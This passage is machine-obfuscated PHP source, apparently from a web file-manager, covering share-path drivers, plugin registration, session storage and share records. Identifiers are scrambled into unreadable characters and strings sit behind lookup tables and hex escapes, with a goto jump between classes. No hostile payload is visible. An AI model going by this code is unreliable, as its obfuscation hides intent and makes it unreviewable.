$_SERVER[óó‹¸‚å]; return Action($’Ø‹ÑØÔ[1182])->sharePathInfo($this->pathParse[$’Ø‹ÑØÔ[84]], !0, $£Ğ˜óĞ¸); } public function listPath($·„öô•, $³¸ÆÂÎ´ = false) { $ñÊ®ÈÌ =& $_SERVER[óó‹¸‚å]; $ŒøüÊ·• = parent::listPath($·„öô•, $³¸ÆÂÎ´); if (!$ŒøüÊ·•) { return $ŒøüÊ·•; } if (is_array($ŒøüÊ·•[$ñÊ®ÈÌ[1352]])) { $ŒøüÊ·•[$ñÊ®ÈÌ[1352]] = Action($ñÊ®ÈÌ[1182])->shareItemInfo($ŒøüÊ·•[$ñÊ®ÈÌ[1352]]); } foreach ($ŒøüÊ·• as $©Ü‰ıÚ¬ => $ÉíıÃƒÃ) { if (!in_array($©Ü‰ıÚ¬, array($ñÊ®ÈÌ[83], $ñÊ®ÈÌ[82]))) { continue; } foreach ($ÉíıÃƒÃ as $„ÖñÂø³ => $–€Åı©·) { $ŒøüÊ·•[$©Ü‰ıÚ¬][$„ÖñÂø³] = Action($ñÊ®ÈÌ[1182])->shareItemInfo($–€Åı©·); } } return $ŒøüÊ·•; } public function listAll($Ú§ëïÓƒ) { $×§îËë´ =& $_SERVER[óó‹¸‚å]; $ßÑŸªé­ = IO::info($this->pathParse[$×§îËë´[84]]); if (!$ßÑŸªé­) { return array(); } $«ú‡à¡Û = $this->model->listAll($Ú§ëïÓƒ); foreach ($«ú‡à¡Û as &$®İç¬ı„) { $®İç¬ı„[$×§îËë´[86]] = Action($×§îËë´[1182])->shareItemInfo($®İç¬ı„[$×§îËë´[86]]); } unset($®İç¬ı„); return $«ú‡à¡Û; } } class PathDriverDriverShareItem { public function __construct($ÀÎÉõóí) { $this->pathParse = $ÀÎÉõóí; } public function __call($û§ô¬š„, $Í¿Œ©¤) { $¼÷£Ñö =& $_SERVER[óó‹¸‚å]; if (method_exists($this, $û§ô¬š„)) { return; } $Ï—ëŞÌŒ = call_user_func_array(array($¼÷£Ñö[1353], $û§ô¬š„), $Í¿Œ©¤); $˜ÚÔ½Èì = array($¼÷£Ñö[1354], $¼÷£Ñö[1355], $¼÷£Ñö[1356], $¼÷£Ñö[1357], $¼÷£Ñö[555], $¼÷£Ñö[557], $¼÷£Ñö[1358], $¼÷£Ñö[107], $¼÷£Ñö[1359], $¼÷£Ñö[1360]); if (in_array($û§ô¬š„, $˜ÚÔ½Èì)) { $Ï—ëŞÌŒ = $this->getPathOuter($Ï—ëŞÌŒ); } return $Ï—ëŞÌŒ; } public function copy($İÙ–’ıÇ, $Ùä÷”Œ, $ØÄåè×â = false, $ß×Ôì€û = false) { return $this->copyMove($İÙ–’ıÇ, $Ùä÷”Œ, $ØÄåè×â, $_SERVER[óó‹¸‚å][555], $ß×Ôì€û); } public function move($©éÂ¸ª˜, $Æ©á¸Ü, $ Ö×ô¶™ = false, $£•ÇóÈç = false) { return $this->copyMove($©éÂ¸ª˜, $Æ©á¸Ü, $ Ö×ô¶™, $_SERVER[óó‹¸‚å][557], $£•ÇóÈç); } private function copyMove($—‡¡çğü, $ÁËÚÆŠç, $åí˜ç“, $Æ³ªŒî¤, $Üè«¨ıÕ = false) { $„Ü…òØ‚ =& $_SERVER[óó‹¸‚å]; $§‹¼ÂÄ = $ÁËÚÆŠç; $¨â´º’ó = IO::driverMake($ÁËÚÆŠç); if ($¨â´º’ó->pathParse[$„Ü…òØ‚[1158]]) { $ÁËÚÆŠç = $¨â´º’ó->pathParse[$„Ü…òØ‚[1158]]; } else { $ÁËÚÆŠç = $§‹¼ÂÄ; } $ÑñÚ‘Å = IO::copyMove($—‡¡çğü, $ÁËÚÆŠç, $åí˜ç“, $Æ³ªŒî¤, $Üè«¨ıÕ); $ÑñÚ‘Å = $this->getPathOuter($ÑñÚ‘Å); return $ÑñÚ‘Å; } public function pathThis($¨ğ‹şç) { return get_path_this($this->pathParse[$_SERVER[óó‹¸‚å][84]]); } public function pathFather($óÙ¾Ä­²) { return get_path_father($this->pathParse[$_SERVER[óó‹¸‚å][84]]); } public function iconvSystem($÷Ñ•Â•) { return $÷Ñ•Â•; } protected function infoParse($é‘ÔÈæÛ, $Ïœı‚¿“ = false) { $Š¡Â—¥Í =& $_SERVER[óó‹¸‚å]; $¦‰äØ–€ = $this->pathParse[$Š¡Â—¥Í[487]][$Š¡Â—¥Í[1183]] . $this->pathParse[$Š¡Â—¥Í[1176]]; if ($Ïœı‚¿“) { $ØËÚ°ÎÀ = IO::infoWithChildren($¦‰äØ–€); } else { $ØËÚ°ÎÀ = IO::info($¦‰äØ–€); } $ç¤±é¶† = $this->pathParse[$Š¡Â—¥Í[487]]; return Action($Š¡Â—¥Í[1351])->_shareItemeParse($ØËÚ°ÎÀ, $ç¤±é¶†); } public function listAll($¦ó¥®ü) { $éüÜ’Õ =& $_SERVER[óó‹¸‚å]; $äÇ¢²ã÷ = IO::listAll($¦ó¥®ü); $¥ÆÊì¶Ö = $this->pathParse[$éüÜ’Õ[487]]; foreach ($äÇ¢²ã÷ as &$ˆá¨¥„Ë) { check_abort(); $•¬†úÆ = IO::info($ˆá¨¥„Ë[$éüÜ’Õ[84]]); $•¬†úÆ = is_array($•¬†úÆ) ? $•¬†úÆ : array(); $ˆá¨¥„Ë = array_merge($•¬†úÆ, $ˆá¨¥„Ë); $ˆá¨¥„Ë[$éüÜ’Õ[86]] = Action($éüÜ’Õ[1351])->_shareItemeParse($ˆá¨¥„Ë, $¥ÆÊì¶Ö); } unset($ˆá¨¥„Ë); return $äÇ¢²ã÷; } public function getPathOuter($ÍôÒâÑŸ) { $˜•äñ«¡ =& $_SERVER[óó‹¸‚å]; $Íó„Áô = KodIO::parse($ÍôÒâÑŸ); if ($Íó„Áô[$˜•äñ«¡[33]] == KodIO::KOD_SHARE_ITEM) { return $Íó„Áô[$˜•äñ«¡[84]]; } $íªÕä© = KodIO::clear($ÍôÒâÑŸ); $ÂË“’®â = KodIO::clear($this->pathParse[$˜•äñ«¡[487]][$˜•äñ«¡[1183]]); $æôô¡Ø¿ = substr($íªÕä©, strlen($ÂË“’®â)); if (substr($íªÕä©, 0, strlen($ÂË“’®â)) != $ÂË“’®â) { return !1; } return $this->pathParse[$˜•äñ«¡[1177]] . $˜•äñ«¡[8] . ltrim($æôô¡Ø¿, $˜•äñ«¡[8]); } public function getType() { $üÅÃòä¶ =& $_SERVER[óó‹¸‚å]; $ö«ñş = str_replace($üÅÃòä¶[74], $üÅÃòä¶[12], get_class($this)); return strtolower($ö«ñş); } public function isTypeObject($µ«Ô•ÂÃ) { return IO::isTypeObject($µ«Ô•ÂÃ); } public function info($¾­óáûÏ) { return $this->infoParse($¾­óáûÏ); } public function infoAuth($®úõâ‰«) { return $this->infoParse($®úõâ‰«); } public function infoWithChildren($Ïò¤Áî´) { return $this->infoParse($Ïò¤Áî´, !0); } public function infoFull($áÜŞµ§¥) { return $this->infoParse($áÜŞµ§¥); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($Çœôì†¥) { $this->pathParse = $Çœôì†¥; } protected function infoParse($Ø÷ëê±ê, $¿è¹¨ı‰ = false) { $ğÈ¿‹¬Á =& $_SERVER[óó‹¸‚å]; return Action($ğÈ¿‹¬Á[1182])->sharePathInfo($this->pathParse[$ğÈ¿‹¬Á[84]], !0, $¿è¹¨ı‰); } public function listPath($¬ÇÌÊÀ, $Ş‘õš½ = false) { $¼Ÿ”š—È =& $_SERVER[óó‹¸‚å]; $ˆÔ­û „ = IO::listPath($¬ÇÌÊÀ, $Ş‘õš½); if (!$ˆÔ­û „) { return $ˆÔ­û „; } if (is_array($ˆÔ­û „[$¼Ÿ”š—È[1352]])) { $õ¥áÏ¨³ = Action($¼Ÿ”š—È[1361])->parsePathChildren($ˆÔ­û „[$¼Ÿ”š—È[1352]], array($¼Ÿ”š—È[421] => $¬ÇÌÊÀ)); $ˆÔ­û „[$¼Ÿ”š—È[1352]] = Action($¼Ÿ”š—È[1182])->shareItemInfo($õ¥áÏ¨³); } foreach ($ˆÔ­û „ as $‰¡¨·ŞŸ => $ğšº‚À±) { if (!in_array($‰¡¨·ŞŸ, array($¼Ÿ”š—È[83], $¼Ÿ”š—È[82]))) { continue; } foreach ($ğšº‚À± as $ÊØº¿· => $õ¥áÏ¨³) { $õ¥áÏ¨³ = Action($¼Ÿ”š—È[1361])->parsePathChildren($õ¥áÏ¨³, array($¼Ÿ”š—È[421] => $¬ÇÌÊÀ)); $ˆÔ­û „[$‰¡¨·ŞŸ][$ÊØº¿·] = Action($¼Ÿ”š—È[1182])->shareItemInfo($õ¥áÏ¨³); } } return $ˆÔ­û „; } public function listAll($¹Ì‚ÛŸ©) { $Öœã°Åõ =& $_SERVER[óó‹¸‚å]; $ˆ¼Ù‘»• = IO::listAll($¹Ì‚ÛŸ©); foreach ($ˆ¼Ù‘»• as &$Æµ“ì©Ë) { $êÓÂĞÔ  = IO::info($Æµ“ì©Ë[$Öœã°Åõ[84]]); $êÓÂĞÔ  = is_array($êÓÂĞÔ ) ? $êÓÂĞÔ  : array(); $Æµ“ì©Ë = array_merge($êÓÂĞÔ , $Æµ“ì©Ë); $Æµ“ì©Ë[$Öœã°Åõ[86]] = Action($Öœã°Åõ[1182])->shareItemInfo($Æµ“ì©Ë); } unset($Æµ“ì©Ë); return $ˆ¼Ù‘»•; } } goto DÔºÎé§ÏÇ; CàªùÜÙÑã: class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\155\56\x70\154\x75\x67\x69\156\114\151\163\x74"; public $field = array("\156\x61\155\x65", "\x73\x74\141\164\165\x73", "\x72\x65\147\151\145\x73\164", "\x63\x6f\x6e\146\151\147"); public function loadList($ÇĞ‡ÚŠã = false) { $”ºùÆı– = array_to_keyvalue($this->listData(), $_SERVER[óó‹¸‚å][32]); if ($ÇĞ‡ÚŠã) { return $”ºùÆı–[$ÇĞ‡ÚŠã]; } return $”ºùÆı–; } public function init() { $±±ß¬ =& $_SERVER[óó‹¸‚å]; Hook::trigger($±±ß¬[1983]); $¡á¢İõÅ = $this->loadPluginList(); foreach ($¡á¢İõÅ as $ï·–¬¬” => $ìİÜÔ¿–) { $±İ‚öïî = $this->appAllow($ï·–¬¬”, $ìİÜÔ¿–); if (!$±İ‚öïî) { continue; } foreach ($ìİÜÔ¿–[$±±ß¬[1984]] as $åİË™Æ´ => $¾À£¹¶ö) { Hook::bind($åİË™Æ´, $¾À£¹¶ö); } } Hook::trigger($±±ß¬[1985]); Hook::trigger(ACTION); } public function appAllow($õ¨ÑÖá¦, $ºÆå¯Â³, $ŒÑ°ÎÒº = true) { $ûòß¤â =& $_SERVER[óó‹¸‚å]; $ãÊ—Š²ó = PLUGIN_DIR . $õ¨ÑÖá¦ . $ûòß¤â[1986]; if (!is_array($ºÆå¯Â³) || !is_array($ºÆå¯Â³[$ûòß¤â[1984]]) || $ºÆå¯Â³[$ûòß¤â[754]] != 1 || !is_file($ãÊ—Š²ó)) { return !1; } if ($GLOBALS[$ûòß¤â[503]] == 1) { if ($GLOBALS[$ûòß¤â[6]][$ûòß¤â[1987]] || !$GLOBALS[$ûòß¤â[6]][$ûòß¤â[1988]]) { return !0; } $ÑğëİªÕ = explode($ûòß¤â[50], strtolower($GLOBALS[$ûòß¤â[6]][$ûòß¤â[1988]])); return in_array(strtolower($õ¨ÑÖá¦), $ÑğëİªÕ) ? !1 : !0; } if ($ŒÑ°ÎÒº && !Action($ûòß¤â[1989])->checkAuth($õ¨ÑÖá¦)) { return !1; } return !0; } public function unInstall($ı¨Œ·¾š) { $öä“›«Ş =& $_SERVER[óó‹¸‚å]; $’¬Ö…ªÔ = $this->loadList($ı¨Œ·¾š); if (file_exists(PLUGIN_DIR . $ı¨Œ·¾š)) { Hook::apply($ı¨Œ·¾š . $öä“›«Ş[1990]); } $this->remove($’¬Ö…ªÔ[$öä“›«Ş[399]]); } public function changeStatus($ş‰×, $ì¢®çàó) { $Å¿¤âìº =& $_SERVER[óó‹¸‚å]; $§¨–Æáú = $this->loadList($ş‰×); if ($ì¢®çàó) { Hook::apply($ş‰× . $Å¿¤âìº[1991]); } $this->update($§¨–Æáú[$Å¿¤âìº[399]], array($Å¿¤âìº[1992] => $ì¢®çàó)); } public function appRegist($İ¤£áÖ‚, $àÆñ‹Ÿ) { $æöêä€¬ =& $_SERVER[óó‹¸‚å]; $¸±ƒñÈ = $this->loadList($İ¤£áÖ‚); if ($¸±ƒñÈ) { $this->update($¸±ƒñÈ[$æöêä€¬[399]], array($æöêä€¬[1984] => $àÆñ‹Ÿ)); } else { $ö®Ğå¶ˆ = array($æöêä€¬[32] => $İ¤£áÖ‚, $æöêä€¬[1984] => $àÆñ‹Ÿ, $æöêä€¬[754] => 0, $æöêä€¬[6] => $this->getConfigDefault($İ¤£áÖ‚)); $this->insert($ö®Ğå¶ˆ); } } public function getConfigDefault($“ÎÑÈ˜) { $ğİ‡öš =& $_SERVER[óó‹¸‚å]; $ÕÂüˆÃŒ = array(); $´ı²±ÖÆ = $this->getPackageJson($“ÎÑÈ˜); if (!$´ı²±ÖÆ && is_array($´ı²±ÖÆ[$ğİ‡öš[1993]])) { return $ÕÂüˆÃŒ; } foreach ($´ı²±ÖÆ[$ğİ‡öš[1993]] as $½‘ô„³© => $ƒØüÉ„«) { if (!isset($ƒØüÉ„«[$ğİ‡öš[374]]) || isset($ÕÂüˆÃŒ[$½‘ô„³©])) { continue; } $ÕÂüˆÃŒ[$½‘ô„³©] = $ƒØüÉ„«[$ğİ‡öš[374]]; } return $ÕÂüˆÃŒ; } public function getPackageJson($×ã÷ö‰ˆ) { return Hook::apply($×ã÷ö‰ˆ . $_SERVER[óó‹¸‚å][1994]); } public function getConfig($Å™ÙÉ‹‹, $ü¦ñ•’ = false) { $ìàéªóÁ =& $_SERVER[óó‹¸‚å]; $¦ôÏ´—ş = array(); $ï‡Öå‚¬ = $this->loadList($Å™ÙÉ‹‹); if ($ï‡Öå‚¬ && is_array($ï‡Öå‚¬[$ìàéªóÁ[6]])) { $¦ôÏ´—ş = $ï‡Öå‚¬[$ìàéªóÁ[6]]; } if (!$¦ôÏ´—ş || $ü¦ñ•’) { $¦ôÏ´—ş = $this->getConfigDefault($Å™ÙÉ‹‹); } return $¦ôÏ´—ş; } public function setConfig($¾æ¥äƒØ, $¸´Ó®şÄ = false) { $Í˜àİ¤ø =& $_SERVER[óó‹¸‚å]; $ ÒŸ¯ë« = $this->loadList($¾æ¥äƒØ); if (!$ ÒŸ¯ë«) { return !1; } $”½¬ÜĞÃ = $ ÒŸ¯ë«[$Í˜àİ¤ø[6]]; if ($¸´Ó®şÄ == !1) { $”½¬ÜĞÃ = array(); $¸´Ó®şÄ = $this->getConfigDefault($¾æ¥äƒØ); } foreach ($¸´Ó®şÄ as $Â¯ìÀ©Ÿ => $÷©‚’) { $”½¬ÜĞÃ[$Â¯ìÀ©Ÿ] = is_string($÷©‚’) ? trim($÷©‚’) : $÷©‚’; } $this->update($ ÒŸ¯ë«[$Í˜àİ¤ø[399]], array($Í˜àİ¤ø[6] => $”½¬ÜĞÃ)); } public function viewList() { $€®¼ŞÜ† =& $_SERVER[óó‹¸‚å]; $Ù¿”•šÍ = $this->loadList(); $this->pluginScan($Ù¿”•šÍ); $Ù¿”•šÍ = $this->loadPluginList(); $ğ«±€é¢ = array(); foreach ($Ù¿”•šÍ as $¹„ƒ¦¯» => $‰½È«ª¼) { unset($‰½È«ª¼[$€®¼ŞÜ†[1984]], $‰½È«ª¼[$€®¼ŞÜ†[6]]); $ƒ¢ªğÃÚ = PLUGIN_DIR . $‰½È«ª¼[$€®¼ŞÜ†[32]] . $€®¼ŞÜ†[1986]; if (!is_file($ƒ¢ªğÃÚ)) { continue; } $Õ¦Ÿ§ŠÒ = Hook::apply($‰½È«ª¼[$€®¼ŞÜ†[32]] . $€®¼ŞÜ†[1994]); if (is_array($Õ¦Ÿ§ŠÒ)) { $ğ«±€é¢[$¹„ƒ¦¯»] = array_merge($‰½È«ª¼, $Õ¦Ÿ§ŠÒ); } } return $ğ«±€é¢; } private function loadPluginList() { $§§·Ç¸ö =& $_SERVER[óó‹¸‚å]; $ˆÖ£‚Ú = $this->loadList(); if (strtolower(MOD) == $§§·Ç¸ö[1995]) { return $ˆÖ£‚Ú; } $Ô´©óÔ‹ = Hook::trigger($§§·Ç¸ö[1996], $ˆÖ£‚Ú); if ($ˆÖ£‚Ú && !$Ô´©óÔ‹) { die; } return $Ô´©óÔ‹ ? $Ô´©óÔ‹ : $ˆÖ£‚Ú; } private function pluginScan($ÅÜéÆµ) { $Óö·Ú°† =& $_SERVER[óó‹¸‚å]; recursion_dir(PLUGIN_DIR, $Ö°äŸèŠ, $ô‘æÔö, 0); foreach ($Ö°äŸèŠ as $ŸÔ­ó«¡) { $É™ôËîù = get_path_this($ŸÔ­ó«¡); if (isset($ÅÜéÆµ[$É™ôËîù]) || !file_exists($ŸÔ­ó«¡ . $Óö·Ú°†[1997]) || !file_exists($ŸÔ­ó«¡ . $Óö·Ú°†[1986])) { continue; } Hook::apply($É™ôËîù . $Óö·Ú°†[1991]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\x73\164\x65\x6d\137\x73\145\163\163\151\x6f\x6e"; public function get($«ú›’²™) { $Æïæ‡ë =& $_SERVER[óó‹¸‚å]; $®ù´¼“µ = $this->where(array($Æïæ‡ë[1998] => $«ú›’²™))->find(); if (!is_array($®ù´¼“µ)) { return !1; } return $®ù´¼“µ[$Æïæ‡ë[759]]; } public function set($Ì¤å çı, $òˆ•Œôç, $µñ¾Ü¤í = 3600) { $³Çß™ê¢ =& $_SERVER[óó‹¸‚å]; $šÍĞ‡Ï = array($³Çß™ê¢[1998] => $Ì¤å çı, $³Çß™ê¢[1902] => $òˆ•Œôç, $³Çß™ê¢[1999] => $µñ¾Ü¤í + time()); if (Session::get($³Çß™ê¢[2000])) { $šÍĞ‡Ï[$³Çß™ê¢[1674]] = Session::get($³Çß™ê¢[2000]); } else { $šÍĞ‡Ï[$³Çß™ê¢[1674]] = 0; } if ($this->get($Ì¤å çı)) { return $this->where(array($³Çß™ê¢[1998] => $Ì¤å çı))->save($šÍĞ‡Ï); } else { return $this->add($šÍĞ‡Ï, array(), !0); } } public function remove($öÎÏ•‘•) { return $this->where(array($_SERVER[óó‹¸‚å][1998] => $öÎÏ•‘•))->delete(); } public function clearTimeout() { return $this->where($_SERVER[óó‹¸‚å][2001] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\x61\x72\145"; protected $dataAuto = array(array("\x6d\157\x64\x69\146\171\124\x69\155\145", "\164\x69\x6d\145", "\151\x6e\x73\145\162\x74\54\x75\160\144\141\x74\145", "\146\165\156\143\164\151\x6f\156"), array("\x63\162\145\141\x74\145\124\151\x6d\145", "\x74\151\x6d\x65", "\x69\x6e\x73\x65\162\x74", "\146\x75\x6e\143\x74\151\x6f\x6e"), array("\x6f\160\164\151\x6f\x6e\163", '', "\151\156\163\x65\x72\164\54\x75\x70\144\141\164\x65\x2c\x73\x65\154\145\x63\164", "\x6a\163\x6f\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($ñÏÍ´Üá) { $°¼Ô¸–Ğ =& $_SERVER[óó‹¸‚å]; $‡Ü¯´ŠÈ = isset($ñÏÍ´Üá[0]) ? $ñÏÍ´Üá[0] : !1; return array($°¼Ô¸–Ğ[2002] => array(USER_ID, $°¼Ô¸–Ğ[2003]), $°¼Ô¸–Ğ[1943] => array($‡Ü¯´ŠÈ, $°¼Ô¸–Ğ[2004])); } protected function listSimple() { $Åû€ùşÃ = array($_SERVER[óó‹¸‚å][1674] => USER_ID); $ş²Âõù = $this->field($this->fieldList)->where($Åû€ùşÃ)->select(); return $ş²Âõù ? $ş²Âõù : array(); } protected function getInfo($óÓÓ´Šï, $ä‘¡à–¾ = false) { $ÒÛ›¶õı =& $_SERVER[óó‹¸‚å]; if ($ä‘¡à–¾) { return $this->_getShareInfo(array($ÒÛ›¶õı[489] => $óÓÓ´Šï)); } $èĞÕêëÅ = $this->cacheFunctionGet($ÒÛ›¶õı[1945], $óÓÓ´Šï); return $èĞÕêëÅ; } public function getInfoByHash($ÔÁå¦Š‚) { return $this->_getShareInfo(array($_SERVER[óó‹¸‚å][491] => $ÔÁå¦Š‚)); } public function getInfoByPath($ãÚÂÔ¤‹) { $œ¤¢é¼ =& $_SERVER[óó‹¸‚å]; $¥øª÷éâ = array($œ¤¢é¼[1674] => USER_ID, $œ¤¢é¼[402] => $ãÚÂÔ¤‹); return $this->_getShareInfo($¥øª÷éâ); } public function getInfoBySourcePath($«éÀ”Ä) { $ßˆûİ =& $_SERVER[óó‹¸‚å]; $¦Úæã© = array($ßˆûİ[1674] => USER_ID, $ßˆûİ[1183] => $«éÀ”Ä); return $this->_getShareInfo($¦Úæã©); } private function _getShareInfo($¢–±Í¡Â) { $Ÿ‰™ïæù =& $_SERVER[óó‹¸‚å]; $Å©¯Ş‡ = $this->where($¢–±Í¡Â)->find(); if (!$Å©¯Ş‡) { return !1; } $¢–±Í¡Â = array($Ÿ‰™ïæù[489] => $Å©¯Ş‡[$Ÿ‰™ïæù[489]]); $™•‹’£ = $Ÿ‰™ïæù[2005]; $Ö“Ù–›¤ = Model($Ÿ‰™ïæù[602])->order($Ÿ‰™ïæù[399])->field($™•‹’£)->where($¢–±Í¡Â)->select(); if ($Å©¯Ş‡[$Ÿ‰™ïæù[402]] == $Ÿ‰™ïæù[197]) { $Å©¯Ş‡[$Ÿ‰™ïæù[86]] = IO::info($Å©¯Ş‡[$Ÿ‰™ïæù[1183]]); } else { $Å©¯Ş‡[$Ÿ‰™ïæù[86]] = Model($Ÿ‰™ïæù[1343])->pathInfo($Å©¯Ş‡[$Ÿ‰™ïæù[402]]); } $Å©¯Ş‡[$Ÿ‰™ïæù[2006]] = $Ö“Ù–›¤; return $Å©¯Ş‡; } protected function getInfoAuth($Íş‰æĞò) { $®ÇÁ•„ =& $_SERVER[óó‹¸‚å]; $’şŒÍ = $this->getInfo($Íş‰æĞò); if ($’şŒÍ[$®ÇÁ•„[1674]] == USER_ID) { $’şŒÍ[$®ÇÁ•„[413]] = $’şŒÍ[$®ÇÁ•„[86]][$®ÇÁ•„[413]]; } else { $’şŒÍ[$®ÇÁ•„[413]] = Model($®ÇÁ•„[502])->authMake($’şŒÍ[$®ÇÁ•„[2006]]); } return $’şŒÍ; } protected function listData($ìèü¥øü = null, $„Æçí = 300) { $îéÆ¸ó« =& $_SERVER[óó‹¸‚å]; $£Ü„¦Ë = array(array($îéÆ¸ó«[494] => array($îéÆ¸ó«[1019], 0), $îéÆ¸ó«[496] => array($îéÆ¸ó«[1019], 0), $îéÆ¸ó«[2007] => $îéÆ¸ó«[1961])); if ($ìèü¥øü == $îéÆ¸ó«[2008]) { $£Ü„¦Ë = array($îéÆ¸ó«[494] => 1); } else { if ($ìèü¥øü == $îéÆ¸ó«[1168]) { $£Ü„¦Ë = array($îéÆ¸ó«[496] => 1); } } $£Ü„¦Ë[$îéÆ¸ó«[1674]] = USER_ID; $­øÏ”Ô» = $this->where($£Ü„¦Ë)->selectPage($„Æçí); return $­øÏ”Ô»; } protected function listToMe($¦¾–²ù = 300) { $µçìÉÇ‚ =& $_SERVER[óó‹¸‚å]; $æã·”ß = Model($µçìÉÇ‚[2009])->userGroupParents(USER_ID); $Ùê…¢‡Œ = array($µçìÉÇ‚[586] => SourceModel::TYPE_USER, $µçìÉÇ‚[505] => USER_ID); if ($æã·”ß) { $Ùê…¢‡Œ = array(array($µçìÉÇ‚[586] => SourceModel::TYPE_USER, $µçìÉÇ‚[505] => USER_ID), array($µçìÉÇ‚[586] => SourceModel::TYPE_GROUP, $µçìÉÇ‚[505] => array($µçìÉÇ‚[7], $æã·”ß)), $µçìÉÇ‚[2007] => $µçìÉÇ‚[1961]); } $ìôüË“– = Model($µçìÉÇ‚[602])->where($Ùê…¢‡Œ)->selectPage($¦¾–²ù); $Òê°´– = array_to_keyvalue_group($ìôüË“–[$µçìÉÇ‚[369]], $µçìÉÇ‚[489]); if (!$Òê°´–) { return $ìôüË“–; } $ğ¶»¬Æ˜ = $µçìÉÇ‚[2010]; $Ùê…¢‡Œ = array($µçìÉÇ‚[489] => array($µçìÉÇ‚[418], array_keys($Òê°´–)), $µçìÉÇ‚[1674] => array($µçìÉÇ‚[1021], $µçìÉÇ‚[197])); $¿À«Û = $this->field($ğ¶»¬Æ˜)->where($Ùê…¢‡Œ)->select(); foreach ($¿À«Û as $ø¶¢¡™ => &$§ıÊ“—‚) { $§ıÊ“—‚[$µçìÉÇ‚[2006]] = $Òê°´–[$§ıÊ“—‚[$µçìÉÇ‚[489]]]; } unset($§ıÊ“—‚); $×Ÿà›“Ò = array($µçìÉÇ‚[2011] => $¿À«Û, $µçìÉÇ‚[2012] => $ìôüË“–[$µçìÉÇ‚[366]]); return $×Ÿà›“Ò; } protected function shareAdd($™èƒãé›, $Ôºú³º¢) { $àï»óŒ =& $_SERVER[óó‹¸‚å]; $Ş×µñÍ· = $this->_addShareData($™èƒãé›, $Ôºú³º¢); if (!empty($Ôºú³º¢[$àï»óŒ[2013]])) { $this->_shareAuthSet($Ş×µñÍ·, $Ôºú³º¢[$àï»óŒ[2013]]); } $this->shareEventAdd($™èƒãé›, $Ôºú³º¢, $àï»óŒ[1171]); return $Ş×µñÍ·; } protected function shareAddSystem($Óş²ğò™, $ÆöÃıßŠ) { $©”—­úç =& $_SERVER[óó‹¸‚å]; $ÌŞ†´Ò = $this->_addShareData($Óş²ğò™, $ÆöÃıßŠ, $©”—­úç[1292]); $this->_shareAuthSet($ÌŞ†´Ò, $ÆöÃıßŠ[$©”—­úç[2013]]); return $ÌŞ†´Ò; } private function shareEventAdd($Íı¯ó‹Ÿ, $áèä€µ, $¡óÏ«Ïó = "\141\144\144") { $ÎùÊÓÄ =& $_SERVER[óó‹¸‚å]; if (!$Íı¯ó‹Ÿ || $Íı¯ó‹Ÿ == $ÎùÊÓÄ[197]) { return; } if ($¡óÏ«Ïó == $ÎùÊÓÄ[1171]) { if ($áèä€µ[$ÎùÊÓÄ[494]] == $ÎùÊÓÄ[88]) { Model($ÎùÊÓÄ[570])->eventShare($Íı¯ó‹Ÿ, $ÎùÊÓÄ[2014]); } if ($áèä€µ[$ÎùÊÓÄ[496]] == $ÎùÊÓÄ[88]) { Model($ÎùÊÓÄ[570])->eventShare($Íı¯ó‹Ÿ, $ÎùÊÓÄ[2015]); } return; } $§ÃÛÃ—ş = $this->getInfoByPath($Íı¯ó‹Ÿ); $ö®‡÷ØÕ = $ÎùÊÓÄ[2016]; if ($§ÃÛÃ—ş[$ÎùÊÓÄ[494]] == $ÎùÊÓÄ[197] && $áèä€µ[$ÎùÊÓÄ[494]] == $ÎùÊÓÄ[88]) { $ö®‡÷ØÕ = $ÎùÊÓÄ[2014]; } if ($§ÃÛÃ—ş[$ÎùÊÓÄ[494]] == $ÎùÊÓÄ[88] && $áèä€µ[$ÎùÊÓÄ[494]] == $ÎùÊÓÄ[197]) { $ö®‡÷ØÕ = $ÎùÊÓÄ[2017]; } if ($§ÃÛÃ—ş[$ÎùÊÓÄ[496]] == $ÎùÊÓÄ[197] && $áèä€µ[$ÎùÊÓÄ[496]] == $ÎùÊÓÄ[88]) { $ö®‡÷ØÕ = $ÎùÊÓÄ[2015]; } if ($§ÃÛÃ—ş[$ÎùÊÓÄ[496]] == $ÎùÊÓÄ[88] && $áèä€µ[$ÎùÊÓÄ[496]] == $ÎùÊÓÄ[197]) { $ö®‡÷ØÕ = $ÎùÊÓÄ[2018]; } Model($ÎùÊÓÄ[570])->eventShare($Íı¯ó‹Ÿ, $ö®‡÷ØÕ); return; } private function _addShareData($ôÂĞ’¼›, $½ÂÃ÷¼Í = array(), $çı¸Í„ò = false) { $î“Òİ¡¥ =& $_SERVER[óó‹¸‚å]; $Òò½ú¸û = $çı¸Í„ò == $î“Òİ¡¥[1292] ? 0 : USER_ID; $§ƒ›–÷Ÿ = array($î“Òİ¡¥[417] => $ôÂĞ’¼›, $î“Òİ¡¥[1665] => $Òò½ú¸û); if ($ôÂĞ’¼› == 0) { $§ƒ›–÷Ÿ = array($î“Òİ¡¥[2019] => $½ÂÃ÷¼Í[$î“Òİ¡¥[1183]], $î“Òİ¡¥[1665] => $Òò½ú¸û); } if ($á›´¹ƒÂ = $this->where($§ƒ›–÷Ÿ)->find()) { return $á›´¹ƒÂ[$î“Òİ¡¥[489]]; } if ($ôÂĞ’¼› == 0) { $ÏÁ£¯ûü = array($î“Òİ¡¥[32] => get_path_this($½ÂÃ÷¼Í[$î“Òİ¡¥[84]])); } else { $ÏÁ£¯ûü = Model($î“Òİ¡¥[829])->sourceInfo($ôÂĞ’¼›); if (!$ÏÁ£¯ûü) { return !1; } } if (!$½ÂÃ÷¼Í[$î“Òİ¡¥[1574]]) { $½ÂÃ÷¼Í[$î“Òİ¡¥[1574]] = $ÏÁ£¯ûü[$î“Òİ¡¥[32]]; } $ê§Ã¨ ä = array($î“Òİ¡¥[1665] => $Òò½ú¸û, $î“Òİ¡¥[417] => $ôÂĞ’¼›, $î“Òİ¡¥[1574] => $î“Òİ¡¥[12], $î“Òİ¡¥[494] => 0, $î“Òİ¡¥[496] => 0, $î“Òİ¡¥[1183] => $î“Òİ¡¥[12], $î“Òİ¡¥[307] => $î“Òİ¡¥[12], $î“Òİ¡¥[896] => $î“Òİ¡¥[12], $î“Òİ¡¥[2020] => 0, $î“Òİ¡¥[2021] => 0, $î“Òİ¡¥[497] => 0, $î“Òİ¡¥[498] => $î“Òİ¡¥[12], $î“Òİ¡¥[491] => $î“Òİ¡¥[12]); $ğ‡á×êî = 